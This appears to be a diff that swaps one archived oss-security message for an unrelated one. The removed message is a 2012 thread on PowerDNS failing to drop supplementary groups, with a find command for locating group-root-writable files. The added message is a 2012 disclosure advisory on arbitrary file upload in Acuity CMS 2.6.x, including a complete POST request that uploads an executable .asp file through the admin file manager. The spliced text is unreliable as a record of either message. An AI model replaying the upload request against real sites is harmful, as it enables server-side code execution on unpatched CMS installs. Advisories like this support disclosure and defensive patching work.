@@ -1,110 +1,101 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2012/05/24/6
-Message-Id: <201205241516.33315.sgrubb@redhat.com>
-Date: Thu, 24 May 2012 15:16:33 -0400
-From: Steve Grubb <sgrubb@...hat.com>
-To: oss-security@...ts.openwall.com
-Cc: Kurt Seifried <kseifried@...hat.com>, David Black <disclosure@....org>, Peter van Dijk <peter.van.dijk@...herlabs.nl>, Bert Hubert <bert.hubert@...herlabs.nl>
-Subject: Re: CVE Request: powerdns does not clear supplementary groups
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2012/05/20/4
+Message-ID: <CAPYM6VxWRRUTezftmwnRiGTZkP29beHNr2Qp9bRuN+qEZLLDBA@mail.gmail.com>
+Date: Sun, 20 May 2012 17:48:55 +0800
+From: YGN Ethical Hacker Group <lists@...g.net>
+To: full-disclosure <full-disclosure@...ts.grok.org.uk>, bugtraq <bugtraq@...urityfocus.com>,  secalert@...urityreason.com, bugs@...uritytracker.com,  vuln <vuln@...unia.com>, vuln@...urity.nnov.ru, news@...uriteam.com,  moderators@...db.org, submissions@...ketstormsecurity.org,  submit@...ecurity.com, oss-security@...ts.openwall.com
+Subject: Acuity CMS 2.6.x <= Arbitrary File Upload
 Content-Type: text/plain; charset=utf-8
 
-On Thursday, May 24, 2012 02:40:10 PM Kurt Seifried wrote:
-> CC'ing the PowerDNS guys.
-> 
-> On 05/24/2012 10:20 AM, David Black wrote:
-> > Powerdns does not drop/clear supplementary groups in its dropPrivs
-> > routine where the intent is to drop privileges.
-> > 
-> > The relevant code can be found in pdns/unix_utility.cc /
-> > pdns-recursor-3.3/unix_utility.cc [0].
-> > 
-> > Can a CVE id be assigned for this issue?
-> > 
-> > 
-> > [0] pdns/unix_utility.cc / pdns-recursor-3.3/unix_utility.cc //
-> > Drops the program's privileges. void Utility::dropPrivs( int uid,
-> > int gid ) { if(gid) { if(setgid(gid)<0) {
-> > theL()<<Logger::Critical<<"Unable to set effective group id to
-> > "<<gid<<": "<<stringerror()<<endl; exit(1); } else
-> > theL()<<Logger::Info<<"Set effective group id to "<<gid<<endl;
-> > 
-> > }
-> > 
-> > if(uid) { if(setuid(uid)<0) { theL()<<Logger::Critical<<"Unable to
-> > set effective user id to "<<uid<<":  "<<stringerror()<<endl;
-> > exit(1); } else theL()<<Logger::Info<<"Set effective user id to
-> > "<<uid<<endl; } }
-> 
-> So the dropping of groups and the dropping of supplementary groups has
-> come up a lot recently, here are my personal thoughts on the matter
-> (with thanks to Steve Grubb for explaining some of the trickier bits).
-> These are of course my personal opinions, any mistakes/errors are mine
-> entirely and so on.
-> 
-> Dropping of the primary user and group privileges is a well known
-> security feature in many programs (e.g. bind, dhcp, apache, etc.). The
-> idea being programs need root to bind to privileged ports/etc. But
-> once done don't need root access. I think clearly in this case if a
-> program is running as root, and claims to give up root privileges but
-> fails to, that is a security issue and worthy of a CVE. In the case
-> where a program does NOT drop privileges, and this feature has now
-> been added (and assuming it works), I think this qualifies as security
-> hardening, not a security fix and NOT worthy of a CVE.
-> 
-> Now it gets messy. What about the dropping of supplementary groups?
-> 
-> Supplemental groups enabled a user to be a member of more than one
-> group at a time (us old timers remember the joys of "newgrp"). Why
-> would anyone want this? You could for example create a group that has
-> permissions to access logging, terminals (e.g. modems, remember those?
-> =) and then add users to it as appropriate (and centralize
-> account/permissions management somewhat and all that good stuff).
-> 
-> So what happens when a program starts running as say root, and root
-> has supplemental groups (like "bin" or "daemon" and the program drops
-> its primary user/group but fails to drop supplementary groups, is that
-> a security issue, and is it worthy of a CVE identifier?
-> 
-> For most cases I'm going to say probably not (aka no). Having
-> supplementary groups is intentional and allows permissions to be more
-> fine grained, you can for example make root a member of "logging" so
-> that even when the app drops root privileges would still have the 
-> supplementary group of "logging" and can do its logging or whatever.
+1. OVERVIEW
 
-Supplemental groups are just for file access or anything that does a group 
-permission check. The only way to determine if this is a security problem is to 
-run the find command looking for any file with that group. Maybe something like 
-this (assuming root):
-
-find / -path /proc -prune -o -type f -gid 0 -perm /00030 -printf "%-55p %g\t%M\n" 
-
-What programs that don't drop privs correctly does is call attention to it as 
-something that should be attacked because it can be used as a stepping stone to 
-other parts of the system. On the programming side, these should always be fixed 
-so that we err on the side of caution. On the CVE issuing side you probably want 
-to see what files exist with permissions that could be used to help decide its 
-importance.
-
-For example, there are a number of files that are group root writable and even 
-more that are group root readable. So, dropping root badly can eventually lead 
-to system compromise in a few steps. but when other groups are involved, you 
-need to run the find command.
-
-For anyone wanting to go bug hunting, I have a script here:
-http://people.redhat.com/sgrubb/security/find-nodrop-groups
-that can be used. It finds many, many problems dropping supplemental groups. More 
-than I alone want to fix.
-
--Steve
+Acuity CMS 2.6.x (ASP-based) versions are vulnerable to Arbitrary File Upload.
 
 
-> So unless someone makes a compelling argument that these are security
-> issues I'm going to err on the side of "security hardening" instead of
-> "security fix" for dropping supplementary groups, but of course not
-> all issues are the same so if you have a specific issue and think it
-> deserves a CVE make a case on OSS-sec.
-> 
-> * Should these issues be fixed? yes. Dropping privileges where
-> possible is usually a good idea, until things break though and then
-> people start disabling things like SELinux or running everything as
-> root to "make it work" :P.
+2. BACKGROUND
+
+Acuity CMS is a powerful but simple, extremely easy to use, low
+priced, easy to deploy content management system. It is a leader in
+its price and feature class.
+
+
+3. VULNERABILITY DESCRIPTION
+
+Acuity CMS 2.6.x (ASP-based) version contain a flaw that may allow an
+attacker to upload .asp/.aspx files without restrictions, which will
+execute ASP(.Net) codes. The issue is due to the script,
+/admin/file_manager/file_upload_submit.asp , not properly sanitizing
+'file1', 'file2', 'file3', 'fileX' parameters.
+
+
+4. VERSIONS AFFECTED
+
+Tested with version 2.6.2.
+
+
+5. PROOF-OF-CONCEPT/EXPLOIT
+
+[REQUEST]
+POST /admin/file_manager/file_upload_submit.asp HTTP/1.1
+Host: localhost
+Cookie: ASPSESSIONID=XXXXXXXXXXXXXXX
+
+-----------------------------6dc3a236402e2
+Content-Disposition: form-data; name="path"
+
+/images
+-----------------------------6dc3a236402e2
+Content-Disposition: form-data; name="rootpath"
+
+/
+-----------------------------6dc3a236402e2
+Content-Disposition: form-data; name="rootdisplay"
+
+http://localhost/
+-----------------------------6dc3a236402e2
+Content-Disposition: form-data; name="status"
+
+confirmed
+-----------------------------6dc3a236402e2
+Content-Disposition: form-data; name="action"
+
+fileUpload
+-----------------------------6dc3a236402e2
+Content-Disposition: form-data; name="file1"; filename="0wned.asp"
+Content-Type: application/octet-stream
+
+<% response.write("0wned!") %>
+
+-----------------------------6dc3a236402e2--
+
+[/REQUEST]
+
+
+6. SOLUTION
+
+The Acunity CMS is no longer in active development.
+It is recommended to user another CMS in active development and support.
+
+
+7. VENDOR
+
+The Collective
+http://www.thecollective.com.au/
+
+
+8. CREDIT
+
+Aung Khant, http://yehg.net, YGN Ethical Hacker Group, Myanmar.
+
+
+9. DISCLOSURE TIME-LINE
+
+2012-05-20: vulnerability disclosed
+
+
+10. REFERENCES
+
+Original Advisory URL:
+http://yehg.net/lab/pr0js/advisories/%5Bacuity_cms2.6%20x_(asp)%5D_arbitrary_fileupload
+
+#yehg [2012-05-20]
